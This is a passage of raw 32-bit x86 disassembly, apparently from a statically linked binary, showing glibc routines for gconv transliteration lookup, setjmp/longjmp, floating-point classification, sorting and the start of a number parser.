nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x10
mov dword [var_10h], eax
mov edi, dword [var_10h]
mov eax, dword [eax + 4]
add edi, 8
mov dword [var_14h], eax
mov eax, dword [var_10h]
mov eax, dword [eax]
mov dword [var_18h], eax
mov esi, dword [edi + 0x20]
test esi, esi
je 0x808409f
mov ebx, esi
mov esi, dword [esi + 0x10]
mov eax, dword [ebx + 8]
test eax, eax
jne 0x80840dd
mov dword [esp], ebx
call fcn.08051180
test esi, esi
jne 0x8084087
mov eax, dword [edi + 8]
test al, 1
jne 0x80840ac
mov edx, dword [edi]
test edx, edx
jne 0x80840d0
add edi, 0x24
test al, 1
je 0x8084080
mov eax, dword [var_10h]
mov dword [esp], eax
call fcn.08051180
mov edx, dword [var_18h]
mov eax, dword [var_14h]
add esp, 0x10
pop ebx
pop esi
pop edi
leave
jmp fcn.08057110
mov dword [esp], edx
call fcn.08051180
mov eax, dword [edi + 8]
jmp 0x80840ac
mov eax, dword [ebx + 0xc]
mov dword [esp], eax
call dword [ebx + 8]
jmp 0x8084093
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov edx, 0
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x5c
test edx, edx
mov eax, dword [ebp + 0x18]
mov eax, dword [eax]
mov dword [ebp - 0x2c], eax
je 0x8084594
mov dword [esp], 3
call section.
mov eax, dword [eax]
mov ebx, dword [eax + 0x118]
test ebx, ebx
je 0x8084321
mov ecx, 0
test ecx, ecx
je 0x808458a
mov dword [esp], 3
call section.
mov eax, dword [eax]
mov eax, dword [eax + 0x11c]
mov dword [ebp - 0x20], eax
mov eax, 0
test eax, eax
je 0x8084580
mov dword [esp], 3
call section.
mov eax, dword [eax]
mov edx, 0
test edx, edx
mov eax, dword [eax + 0x120]
mov dword [ebp - 0x24], eax
je 0x8084576
mov dword [esp], 3
call section.
mov eax, dword [eax]
mov ecx, 0
test ecx, ecx
mov eax, dword [eax + 0x124]
mov dword [ebp - 0x28], eax
je 0x808456c
mov dword [esp], 3
call section.
mov eax, dword [eax]
mov edi, dword [eax + 0x128]
mov eax, dword [ebp - 0x2c]
add eax, 4
cmp eax, dword [ebp + 0x1c]
jbe 0x80841ea
mov ebx, dword [ebp + 0x1c]
cmp dword [ebp - 0x2c], ebx
setne al
movzx eax, al
lea eax, [eax + eax*2 + 4]
add esp, 0x5c
pop ebx
pop esi
pop edi
leave
ret
mov dword [ebp - 0x30], 0
mov dword [ebp - 0x34], ebx
cmp dword [ebp - 0x30], ebx
jae 0x8084321
mov eax, dword [ebp - 0x30]
mov edx, dword [ebp - 0x20]
mov dword [ebp - 0x3c], 0
add eax, dword [ebp - 0x34]
mov ecx, dword [ebp - 0x2c]
shr eax, 1
mov esi, dword [edx + eax*4]
mov dword [ebp - 0x38], eax
mov edx, esi
lea esi, [esi]
mov eax, dword [ebp - 0x2c]
mov ebx, dword [ebp - 0x3c]
mov ebx, dword [eax + ebx*4]
mov eax, dword [ebp - 0x24]
cmp dword [eax + esi*4], ebx
jne 0x8084246
inc edx
inc dword [ebp - 0x3c]
add ecx, 4
mov ebx, dword [eax + edx*4]
mov esi, edx
test ebx, ebx
je 0x8084246
cmp ecx, dword [ebp + 0x1c]
jb 0x8084220
mov ecx, dword [ebp - 0x3c]
test ecx, ecx
jle 0x80842f1
mov edx, dword [ebp - 0x24]
mov edx, dword [edx + esi*4]
test edx, edx
jne 0x8084562
mov ebx, dword [ebp - 0x38]
mov eax, dword [ebp - 0x28]
mov ecx, dword [eax + ebx*4]
mov eax, dword [edi + ecx*4]
test eax, eax
jne 0x80842df
mov ebx, ecx
mov edx, dword [ebp + 0x20]
lea eax, [edi + ecx*4]
mov ecx, dword [ebp + 8]
mov dword [ebp - 0x14], eax
mov eax, dword [edx]
mov dword [ebp - 0x10], eax
mov eax, dword [ecx + 0x14]
mov dword [esp], eax
call fcn.08083520
lea eax, [ebp - 0x10]
mov ecx, dword [ebp + 0xc]
lea edx, [ebp - 0x14]
mov dword [esp + 0x10], eax
mov dword [esp + 8], edx
mov dword [esp + 0x1c], 0
lea eax, [edi + ebx*4]
mov dword [esp + 0x18], 0
mov dword [esp + 0x14], 0
mov dword [esp + 0xc], eax
mov dword [esp + 4], ecx
mov eax, dword [ebp + 8]
mov dword [esp], eax
call dword [eax + 0x14]
cmp eax, 6
mov edx, eax
jne 0x8084541
lea ecx, [ebx + 1]
mov ebx, dword [edi + ecx*4]
test ebx, ebx
je 0x80842f1
lea edx, [edi + ecx*4]
mov eax, ecx
add edx, 4
inc eax
cmp dword [edx], 0
mov ebx, eax
jne 0x80842e4
jmp 0x8084271
mov ebx, dword [ebp - 0x3c]
mov edx, dword [ebp - 0x2c]
lea eax, [edx + ebx*4]
cmp eax, dword [ebp + 0x1c]
jae 0x808430e
mov ecx, dword [ebp - 0x24]
mov eax, dword [edx + ebx*4]
cmp dword [ecx + esi*4], eax
jae 0x8084536
mov ebx, dword [ebp - 0x38]
inc ebx
mov dword [ebp - 0x30], ebx
mov edx, dword [ebp - 0x34]
cmp dword [ebp - 0x30], edx
jb 0x80841fd
mov ecx, 0
test ecx, ecx
je 0x808452c
mov dword [esp], 3
call section.
mov eax, dword [eax]
mov edx, dword [eax + 0x134]
test edx, edx
je 0x80843d8
mov ebx, 0
test ebx, ebx
je 0x8084522
mov dword [esp], 3
call section.
mov eax, dword [eax]
mov eax, dword [eax + 0x134]
mov dword [ebp - 0x40], eax
mov eax, 0
test eax, eax
je 0x8084518
mov dword [esp], 3
call section.
mov eax, dword [eax]
mov edx, dword [ebp + 0x18]
mov ebx, dword [eax + 0x138]
mov edx, dword [edx]
mov eax, dword [ebp - 0x2c]
mov dword [ebp - 0x44], edx
mov esi, dword [edx]
add eax, 4
cmp eax, dword [ebp + 0x1c]
ja 0x8084451
xor edi, edi
cmp edi, dword [ebp - 0x40]
jge 0x80843d8
mov ecx, dword [ebx]
cmp ecx, esi
ja 0x80843cb
cmp esi, dword [ebx + 4]
ja 0x80843cb
mov eax, esi
xor edx, edx
sub eax, ecx
div dword [ebx + 8]
test edx, edx
je 0x8084501
cmp esi, ecx
jb 0x80843d8
add ebx, 0xc
inc edi
cmp edi, dword [ebp - 0x40]
jl 0x80843af
mov ebx, 0
test ebx, ebx
je 0x80844f7
mov dword [esp], 3
call section.
mov eax, dword [eax]
mov eax, dword [eax + 0x12c]
test eax, eax
je 0x80844d9
mov eax, 0
test eax, eax
je 0x80844ed
mov dword [esp], 3
call section.
mov eax, dword [eax]
mov edx, 0
test edx, edx
mov ebx, dword [eax + 0x130]
mov dword [ebp - 0x1c], ebx
je 0x80844e3
mov dword [esp], 3
call section.
mov eax, dword [eax]
mov esi, dword [eax + 0x12c]
mov eax, dword [ebp - 0x2c]
add eax, 4
cmp eax, dword [ebp + 0x1c]
jbe 0x808445c
mov ecx, dword [ebp + 0x1c]
cmp dword [ebp - 0x2c], ecx
jmp 0x80841d8
mov edx, dword [ebp + 0x20]
mov ecx, dword [ebp + 8]
mov eax, dword [edx]
mov dword [ebp - 0x18], eax
mov eax, dword [ecx + 0x14]
mov dword [esp], eax
call fcn.08083520
lea eax, [ebp - 0x18]
mov dword [esp + 0x1c], 0
mov dword [esp + 0x18], 0
mov dword [esp + 0x10], eax
mov dword [esp + 0x14], 0
lea eax, [ebx + esi*4]
mov dword [esp + 0xc], eax
mov ebx, dword [ebp + 0xc]
lea eax, [ebp - 0x1c]
mov dword [esp + 8], eax
mov eax, dword [ebp + 8]
mov dword [esp + 4], ebx
mov dword [esp], eax
call dword [eax + 0x14]
cmp eax, 6
mov edx, eax
je 0x80844d9
cmp eax, 4
je 0x80844ca
mov eax, dword [ebp - 0x18]
mov ecx, dword [ebp + 0x20]
mov dword [ecx], eax
mov eax, edx
jmp 0x80841e2
mov ecx, dword [ebp + 0x24]
mov ebx, dword [ebp + 0x18]
xor edx, edx
inc dword [ecx]
add dword [ebx], 4
jmp 0x80844bb
mov eax, 6
jmp 0x80841e2
mov eax, dword [0x80a9ab4]
jmp 0x808443e
mov eax, dword [0x80a9ab4]
jmp 0x808441a
mov eax, dword [0x80a9ab4]
jmp 0x80843f1
mov eax, dword [ebp - 0x44]
mov ebx, dword [ebp + 0x18]
add eax, 4
mov dword [ebx], eax
mov eax, dword [ebp + 0x24]
inc dword [eax]
xor eax, eax
jmp 0x80841e2
mov eax, dword [0x80a9ab4]
jmp 0x8084387
mov eax, dword [0x80a9ab4]
jmp 0x8084363
mov eax, dword [0x80a9ab4]
jmp 0x808433a
mov eax, dword [ebp - 0x38]
mov dword [ebp - 0x34], eax
jmp 0x8084315
cmp eax, 4
je 0x808454e
mov eax, dword [ebp - 0x10]
jmp 0x80844be
mov eax, dword [ebp - 0x3c]
mov ecx, dword [ebp + 0x18]
xor edx, edx
mov ebx, dword [ebp + 0x24]
shl eax, 2
add dword [ecx], eax
inc dword [ebx]
jmp 0x8084546
mov eax, 7
jmp 0x80841e2
mov eax, dword [0x80a9ab4]
jmp 0x80841bf
mov eax, dword [0x80a9ab4]
jmp 0x808419b
mov eax, dword [0x80a9ab4]
jmp 0x8084177
mov eax, dword [0x80a9ab4]
jmp 0x8084153
mov eax, dword [0x80a9ab4]
jmp 0x808412a
mov esi, esi
push ebp
mov ebp, esp
mov eax, dword [arg_ch]
mov eax, dword [eax]
mov dword [arg_ch], eax
mov eax, dword [arg_8h]
mov eax, dword [eax]
mov dword [arg_8h], eax
leave
jmp fcn.08076e50
lea esi, [esi]
push ebp
mov ebp, esp
sub esp, 0x10
mov dword [var_4h], ebx
mov dword [var_sp_4h], 1
mov ebx, dword [arg_8h]
mov eax, dword [ebx + 0x20]
mov dword [esp], eax
call fcn.080836e0
mov edx, 1
test eax, eax
mov dword [ebx + 0x24], eax
jne 0x80845f2
mov ebx, dword [var_4h]
mov eax, edx
leave
ret
mov dword [var_sp_4h], str.gconv_trans_context
mov dword [esp], eax
call fcn.08083750
test eax, eax
mov edx, eax
je 0x808468f
lea eax, [ebx + 0xc]
mov dword [var_8h], eax
lea eax, [ebx + 8]
mov dword [var_sp_4h], eax
mov eax, dword [ebx]
mov dword [esp], eax
call edx
test eax, eax
jne 0x808468f
mov dword [var_sp_4h], str.gconv_trans
mov eax, dword [ebx + 0x24]
mov dword [esp], eax
call fcn.08083750
test eax, eax
mov dword [ebx + 0x10], eax
je 0x808468f
mov dword [var_sp_4h], str.gconv_trans_init
mov eax, dword [ebx + 0x24]
mov dword [esp], eax
call fcn.08083750
mov dword [ebx + 0x18], eax
mov dword [var_sp_4h], str.gconv_trans_context
mov eax, dword [ebx + 0x24]
mov dword [esp], eax
call fcn.08083750
mov dword [ebx + 0x14], eax
mov dword [var_sp_4h], str.gconv_trans_end
mov eax, dword [ebx + 0x24]
mov dword [esp], eax
call fcn.08083750
xor edx, edx
mov dword [ebx + 0x1c], eax
mov dword [ebx + 0x28], 1
jmp 0x80845eb
mov eax, dword [ebx + 0x24]
mov dword [esp], eax
call fcn.08083790
mov edx, 1
mov dword [ebx + 0x24], 0
jmp 0x80845eb
nop
lea esi, [esi]
push ebp
mov ebp, esp
push edi
push esi
push ebx
mov ebx, eax
sub esp, 0x1c
mov eax, dword [eax]
mov dword [var_10h], 1
test eax, eax
je 0x80848ac
mov eax, 0
test eax, eax
je 0x80846e1
mov dword [esp], 0x80aaa48
call section.
mov dword [var_8h], fcn.080845a0
mov dword [var_4h], 0x80aaa44
mov dword [esp], ebx
call fcn.0807a2c0
test eax, eax
mov edi, eax
je 0x8084773
mov edx, dword [eax]
mov eax, dword [edx + 0x24]
test eax, eax
je 0x8084712
inc eax
je 0x8084732
mov dword [var_10h_2], 0
mov eax, 0
test eax, eax
je 0x8084727
mov dword [esp], 0x80aaa48
call section.
mov eax, dword [var_10h_2]
add esp, 0x1c
pop ebx
pop esi
pop edi
leave
ret
mov dword [esp], edx
call fcn.080845c0
test eax, eax
jne 0x8084712
mov edx, dword [edi]
mov eax, dword [edx]
mov dword [ebx], eax
mov eax, dword [edx + 4]
mov dword [ebx + 4], eax
mov eax, dword [edx + 8]
mov dword [ebx + 8], eax
mov eax, dword [edx + 0xc]
mov dword [ebx + 0xc], eax
mov eax, dword [edx + 0x10]
mov dword [ebx + 0x10], eax
mov eax, dword [edx + 0x14]
mov dword [ebx + 0x14], eax
mov eax, dword [edx + 0x18]
mov dword [ebx + 0x18], eax
mov eax, dword [edx + 0x1c]
mov dword [ebx + 0x1c], eax
inc dword [edx + 0x28]
jmp 0x808470b
mov eax, dword [ebx]
mov dword [esp], eax
call fcn.08053400
mov dword [var_18h], 0
inc eax
mov dword [var_14h], eax
mov eax, dword [0x80aacac]
test eax, eax
je 0x80848a2
cmp dword [var_14h], 4
jbe 0x80847b2
mov eax, dword [var_14h]
mov edi, 0x80a4c29
mov ecx, 3
add eax, dword [ebx]
cld
lea esi, [eax - 4]
repe cmpsb byte [esi], byte ptr es:[edi]
je 0x80847b9
mov dword [var_18h], 1
mov eax, dword [var_14h]
mov edx, dword [var_14h]
add eax, dword [0x80aaca8]
lea eax, [edx + eax + 0x2f]
mov dword [esp], eax
call fcn.08050fe0
test eax, eax
mov esi, eax
je 0x8084712
xor eax, eax
mov ecx, 0xb
mov edi, esi
cld
rep stosd dword es:[edi], eax
lea edx, [esi + 0x2c]
mov dword [esi], edx
mov dword [esp], edx
mov eax, dword [var_14h]
mov dword [var_8h], eax
mov eax, dword [ebx]
mov dword [var_4h], eax
call fcn.08053740
mov edi, dword [0x80aacac]
mov dword [esi + 0x20], eax
mov eax, dword [edi]
test eax, eax
jne 0x8084842
mov dword [esi + 0x20], 0
mov dword [var_8h], fcn.080845a0
mov dword [var_4h], 0x80aaa44
mov dword [esp], esi
call fcn.0807a190
test eax, eax
mov eax, 1
cmovne eax, dword [var_10h_2]
mov dword [var_10h_2], eax
jmp 0x8084712
mov dword [var_4h], eax
mov eax, dword [esi + 0x20]
mov dword [esp], eax
call fcn.080773c0
mov edx, dword [var_14h]
mov dword [esp], eax
mov dword [var_8h], edx
mov edx, dword [ebx]
mov dword [var_4h], edx
call fcn.08053740
mov edx, eax
mov eax, dword [var_18h]
test eax, eax
je 0x8084875
mov dword [edx], 0x6f732e
mov dword [esp], esi
call fcn.080845c0
test eax, eax
je 0x8084896
add edi, 8
mov eax, dword [edi]
test eax, eax
jne 0x8084842
mov edi, dword [var_10h_2]
test edi, edi
je 0x8084817
jmp 0x8084810
mov dword [var_10h_2], 0
jmp 0x8084817
call fcn.08057930
jmp 0x8084795
mov dword [var_ch], str.__gconv_translit_find
mov dword [var_8h], 0x141
mov dword [var_4h], str.gconv_trans.c
mov dword [esp], str.trans__name_____void__0_
call fcn.0805efc0
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov eax, 0
mov ebp, esp
sub esp, 4
test eax, eax
je 0x8084926
mov dword [esp], 3
call section.
mov edx, eax
mov eax, dword [arg_8h]
mov eax, dword [edx + eax*4 + 0x40]
leave
ret
mov edx, dword [0x80a9ab4]
jmp 0x808491d
nop
nop
push ebp
mov ebp, esp
mov edx, dword [arg_ch]
mov eax, dword [arg_8h]
leave
mov ecx, edx
and edx, 0x7fffffff
xor edx, 0x7ff00000
sar ecx, 0x1e
or eax, edx
mov edx, eax
neg edx
or eax, edx
sar eax, 0x1f
not eax
and eax, ecx
ret
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
mov eax, dword [arg_8h]
mov edx, dword [arg_ch]
leave
mov ecx, edx
mov edx, eax
neg edx
and ecx, 0x7fffffff
or eax, edx
shr eax, 0x1f
or ecx, eax
mov eax, 0x7ff00000
sub eax, ecx
shr eax, 0x1f
ret
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
sub esp, 0x18
mov ecx, dword [arg_10h]
mov eax, dword [arg_8h]
mov edx, dword [arg_ch]
mov dword [var_10h], ecx
mov dword [var_18h], eax
movsx ecx, word [var_10h]
mov dword [var_14h], edx
mov eax, dword [var_14h]
mov edx, ecx
xor eax, 0x80000000
and ecx, 0x8000
and edx, 0x7fff
sar ecx, 0xe
xor edx, 0x7fff
or eax, edx
or eax, dword [var_18h]
leave
mov edx, eax
neg edx
or eax, edx
mov edx, 1
sar eax, 0x1f
sub edx, ecx
not eax
and eax, edx
ret
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
sub esp, 0x18
mov eax, dword [arg_8h]
mov edx, dword [arg_ch]
mov ecx, dword [arg_10h]
mov dword [var_18h], eax
mov dword [var_14h], edx
mov eax, dword [var_14h]
mov dword [var_10h], ecx
movsx edx, word [var_10h]
and eax, 0x7fffffff
or eax, dword [var_18h]
leave
and edx, 0x7fff
add edx, edx
mov ecx, eax
neg ecx
or eax, ecx
shr eax, 0x1f
or edx, eax
mov eax, 0xfffe
sub eax, edx
sar eax, 0x10
ret
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
xor eax, eax
mov edx, dword [arg_4h]
mov dword [edx], ebx
mov dword [edx + 4], esi
mov dword [edx + 8], edi
lea ecx, [arg_4h]
mov dword [edx + 0x10], ecx
mov ecx, dword [esp]
mov dword [edx + 0x14], ecx
mov dword [edx + 0xc], ebp
mov dword [edx + 0x18], eax
ret
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
sub esp, 0x14
mov dword [var_8h], ebx
mov dword [var_4h], esi
mov ebx, dword [arg_ch]
mov esi, dword [arg_8h]
mov dword [var_sp_4h], ebx
mov dword [esp], esi
call fcn.08084b00
mov eax, dword [esi + 0x18]
test eax, eax
jne 0x8084ac0
mov eax, 1
test ebx, ebx
mov dword [esp], esi
cmovne eax, ebx
mov dword [var_sp_4h], eax
call fcn.08084ae0
nop
lea esi, [esi]
lea eax, [esi + 0x1c]
mov dword [var_sp_8h], 0
mov dword [esp], 2
mov dword [var_sp_4h], eax
call fcn.08049180
jmp 0x8084aa5
nop
nop
nop
mov ecx, dword [arg_4h]
mov eax, dword [arg_8h]
mov edx, dword [ecx + 0x14]
mov ebx, dword [ecx]
mov esi, dword [ecx + 4]
mov edi, dword [ecx + 8]
mov ebp, dword [ecx + 0xc]
mov esp, dword [ecx + 0x10]
jmp edx
nop
nop
nop
nop
mov eax, 0
push ebp
test eax, eax
mov ebp, esp
je 0x8084b15
mov dword [arg_ch], ebp
leave
jmp section.
leave
ret
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov eax, 0
mov ebp, esp
sub esp, 0xc
test eax, eax
mov dword [var_4h], ebx
mov ebx, dword [arg_8h]
je 0x8084b5e
mov ebx, dword [var_4h]
leave
jmp section.
call fcn.08053db0
mov dword [var_sp_4h], ebx
mov dword [esp], eax
call fcn.08049220
mov ebx, dword [var_4h]
leave
ret
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x14c
mov edx, dword [arg_10h]
mov eax, dword [arg_8h]
mov dword [var_11ch], eax
shl edx, 2
mov eax, dword [arg_ch]
mov dword [var_120h], edx
test eax, eax
je 0x8084cfe
lea edx, [eax - 1]
cmp eax, 4
mov dword [var_140h], edx
jbe 0x8084c06
mov eax, dword [arg_10h]
mov edx, dword [var_11ch]
mov dword [var_118h], 0
imul eax, dword [var_140h]
mov dword [var_114h], 0
mov dword [var_124h], edx
add eax, edx
lea edx, [var_118h]
mov dword [var_128h], eax
lea eax, [var_110h]
cmp edx, eax
mov dword [var_12ch], eax
jb 0x8084d24
mov eax, dword [arg_10h]
mov esi, dword [var_11ch]
imul eax, dword [var_140h]
mov edx, dword [var_120h]
lea ebx, [edx + esi]
add eax, dword [var_11ch]
cmp ebx, eax
mov dword [var_138h], eax
cmova ebx, eax
mov eax, dword [arg_10h]
lea edi, [eax + esi]
cmp edi, ebx
mov dword [var_144h], edi
jbe 0x8084d09
cmp esi, dword [var_11ch]
je 0x8084c66
mov edi, dword [arg_10h]
mov ebx, esi
mov ecx, dword [var_11ch]
movzx edx, byte [ebx]
movzx eax, byte [ecx]
mov byte [ebx], al
mov byte [ecx], dl
inc ebx
inc ecx
dec edi
jne 0x8084c57
mov edi, dword [var_144h]
add edi, dword [arg_10h]
cmp edi, dword [var_138h]
ja 0x8084cfe
mov esi, edi
lea esi, [esi]
sub esi, dword [arg_10h]
mov dword [esp], edi
mov dword [var_4h], esi
call dword [arg_14h]
test eax, eax
js 0x8084c80
add esi, dword [arg_10h]
mov edx, dword [arg_10h]
lea edx, [edx + edi]
cmp esi, edi
mov dword [var_148h], edx
je 0x8084cec
mov eax, dword [arg_10h]
add eax, edi
mov ebx, eax
mov dword [var_148h], eax
dec ebx
cmp ebx, edi
jb 0x8084cec
movzx edx, byte [ebx]
mov ecx, ebx
mov byte [var_139h], dl
mov edx, ebx
sub edx, dword [arg_10h]
cmp edx, esi
jb 0x8084cde
lea esi, [esi]
movzx eax, byte [edx]
mov byte [ecx], al
mov ecx, edx
sub edx, dword [arg_10h]
cmp edx, esi
jae 0x8084cd0
movzx eax, byte [var_139h]
dec ebx
cmp ebx, edi
mov byte [ecx], al
jae 0x8084cb6
mov edi, dword [var_148h]
cmp edi, dword [var_138h]
jbe 0x8084c7b
add esp, 0x14c
pop ebx
pop esi
pop edi
leave
ret
mov dword [var_4h], esi
mov dword [esp], edi
call dword [arg_14h]
test eax, eax
cmovs esi, edi
add edi, dword [arg_10h]
cmp edi, ebx
jbe 0x8084d09
jmp 0x8084c44
mov eax, dword [var_128h]
xor edx, edx
sub eax, dword [var_124h]
div dword [arg_10h]
shr eax, 1
imul eax, dword [arg_10h]
add eax, dword [var_124h]
mov dword [var_134h], eax
mov edx, dword [var_134h]
mov eax, dword [var_124h]
mov dword [esp], edx
mov dword [var_4h], eax
call dword [arg_14h]
test eax, eax
js 0x8084fa5
mov eax, dword [var_134h]
mov edx, dword [var_128h]
mov dword [var_4h], eax
mov dword [esp], edx
call dword [arg_14h]
test eax, eax
js 0x8084f46
mov eax, dword [var_124h]
mov edi, dword [var_128h]
add eax, dword [arg_10h]
sub edi, dword [arg_10h]
mov dword [var_130h], eax
nop
lea esi, [esi]
mov eax, dword [var_134h]
mov edx, dword [var_130h]
mov dword [var_4h], eax
mov dword [esp], edx
call dword [arg_14h]
test eax, eax
js 0x8084f38
mov esi, esi
mov eax, dword [var_134h]
mov dword [var_4h], edi
mov dword [esp], eax
call dword [arg_14h]
test eax, eax
jns 0x8084dd9
sub edi, dword [arg_10h]
jmp 0x8084dc0
cmp dword [var_130h], edi
jae 0x8084f1f
mov esi, dword [arg_10h]
mov ebx, dword [var_130h]
mov ecx, edi
movzx edx, byte [ebx]
movzx eax, byte [ecx]
mov byte [ebx], al
mov byte [ecx], dl
inc ebx
inc ecx
dec esi
jne 0x8084df0
mov edx, dword [var_130h]
cmp dword [var_134h], edx
je 0x8084f14
cmp dword [var_134h], edi
mov eax, dword [var_130h]
cmovne eax, dword [var_134h]
mov dword [var_134h], eax
mov edx, dword [arg_10h]
add dword [var_130h], edx
sub edi, edx
cmp dword [var_130h], edi
jbe 0x8084da0
mov eax, edi
sub eax, dword [var_124h]
cmp eax, dword [var_120h]
ja 0x8084eac
mov eax, dword [var_128h]
mov edx, dword [var_130h]
sub eax, dword [var_130h]
cmp eax, dword [var_120h]
mov dword [var_124h], edx
ja 0x8084e95
sub dword [var_12ch], 8
mov eax, dword [var_12ch]
mov edx, dword [var_12ch]
mov eax, dword [eax]
mov edx, dword [edx + 4]
mov dword [var_124h], eax
mov dword [var_128h], edx
lea eax, [var_118h]
cmp eax, dword [var_12ch]
jb 0x8084d24
jmp 0x8084c06
mov edx, dword [var_128h]
sub edx, dword [var_130h]
cmp edx, dword [var_120h]
jbe 0x8084f0c
cmp eax, edx
jle 0x8084eec
mov edx, dword [var_12ch]
mov eax, dword [var_124h]
mov dword [edx + 4], edi
mov dword [edx], eax
add edx, 8
mov dword [var_12ch], edx
mov edx, dword [var_130h]
mov dword [var_124h], edx
jmp 0x8084e95
mov eax, dword [var_12ch]
mov edx, dword [var_130h]
mov dword [eax], edx
mov edx, dword [var_128h]
mov dword [eax + 4], edx
add eax, 8
mov dword [var_12ch], eax
mov dword [var_128h], edi
jmp 0x8084e95
mov dword [var_134h], edi
jmp 0x8084e2a
jne 0x8084e35
mov eax, dword [arg_10h]
add eax, edi
sub edi, dword [arg_10h]
mov dword [var_130h], eax
jmp 0x8084e41
mov edx, dword [arg_10h]
add dword [var_130h], edx
jmp 0x8084da0
mov esi, dword [arg_10h]
mov ebx, dword [var_134h]
mov ecx, dword [var_128h]
movzx edx, byte [ebx]
movzx eax, byte [ecx]
mov byte [ebx], al
mov byte [ecx], dl
inc ebx
inc ecx
dec esi
jne 0x8084f55
mov eax, dword [var_124h]
mov edx, dword [var_134h]
mov dword [var_4h], eax
mov dword [esp], edx
call dword [arg_14h]
test eax, eax
jns 0x8084d83
mov esi, dword [arg_10h]
mov ebx, dword [var_134h]
mov ecx, dword [var_124h]
movzx edx, byte [ebx]
movzx eax, byte [ecx]
mov byte [ebx], al
mov byte [ecx], dl
inc ebx
inc ecx
dec esi
jne 0x8084f91
jmp 0x8084d83
mov esi, dword [arg_10h]
mov ebx, dword [var_134h]
mov ecx, dword [var_124h]
movzx edx, byte [ebx]
movzx eax, byte [ecx]
mov byte [ebx], al
mov byte [ecx], dl
inc ebx
inc ecx
dec esi
jne 0x8084fb4
jmp 0x8084d65
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov eax, 0
mov ebp, esp
sub esp, 0x14
test eax, eax
je 0x8085041
mov dword [esp], 3
call section.
mov dword [var_10h], eax
mov eax, dword [arg_14h]
mov dword [var_ch], eax
mov eax, dword [arg_10h]
mov dword [var_8h], eax
mov eax, dword [arg_ch]
mov dword [var_4h], eax
mov eax, dword [arg_8h]
mov dword [esp], eax
call fcn.08085180
leave
ret
mov eax, dword [0x80a9ab4]
jmp 0x808501b
nop
lea esi, [esi]
push ebp
mov eax, 0
mov ebp, esp
sub esp, 0x14
test eax, eax
je 0x8085092
mov dword [esp], 3
call section.
mov dword [esp + 0x10], eax
mov dword [esp + 0xc], 0
mov eax, dword [ebp + 0x10]
mov dword [esp + 8], eax
mov eax, dword [ebp + 0xc]
mov dword [esp + 4], eax
mov eax, dword [ebp + 8]
mov dword [esp], eax
call fcn.08085180
leave
ret
mov eax, dword [0x80a9ab4]
jmp 0x808506b
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov eax, 0
mov ebp, esp
sub esp, 0x14
test eax, eax
je 0x8085101
mov dword [esp], 3
call section.
mov dword [var_10h], eax
mov eax, dword [arg_14h]
mov dword [var_ch], eax
mov eax, dword [arg_10h]
mov dword [var_8h], eax
mov eax, dword [arg_ch]
mov dword [var_4h], eax
mov eax, dword [arg_8h]
mov dword [esp], eax
call fcn.080856c0
leave
ret
mov eax, dword [0x80a9ab4]
jmp 0x80850db
nop
lea esi, [esi]
push ebp
mov eax, 0
mov ebp, esp
sub esp, 0x14
test eax, eax
je 0x8085152
mov dword [esp], 3
call section.
mov dword [esp + 0x10], eax
mov dword [esp + 0xc], 0
mov eax, dword [ebp + 0x10]
mov dword [esp + 8], eax
mov eax, dword [ebp + 0xc]
mov dword [esp + 4], eax
mov eax, dword [ebp + 8]
mov dword [esp], eax
call fcn.080856c0
leave
ret
mov eax, dword [0x80a9ab4]
jmp 0x808512b
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x64
mov dword [var_38h], 0
mov dword [var_34h], 0
mov edx, dword [arg_18h]
mov esi, dword [arg_10h]
mov eax, dword [edx + 4]
mov edx, dword [arg_14h]
test edx, edx
jne 0x8085658
mov dword [var_3ch], 0
test esi, esi
js 0x80851c0
cmp esi, 1
je 0x80851c0
cmp esi, 0x24
jle 0x80851d7
call fcn.08048b20
mov dword [eax], 0x16
xor eax, eax
xor edx, edx
add esp, 0x64
pop ebx
pop esi
pop edi
leave
ret
mov edi, dword [arg_8h]
mov ebx, dword [arg_18h]
mov dword [var_28h], edi
mov ebx, dword [ebx + 0x34]
movsx eax, byte [edi]
mov dword [var_50h], ebx
test byte [ebx + eax*2 + 1], 0x20
je 0x808564d
inc edi
mov ecx, dword [var_50h]
movzx edx, byte [edi]
movsx eax, dl
test byte [ecx + eax*2 + 1], 0x20
jne 0x80851f4
test dl, dl
je 0x8085370
cmp dl, 0x2d
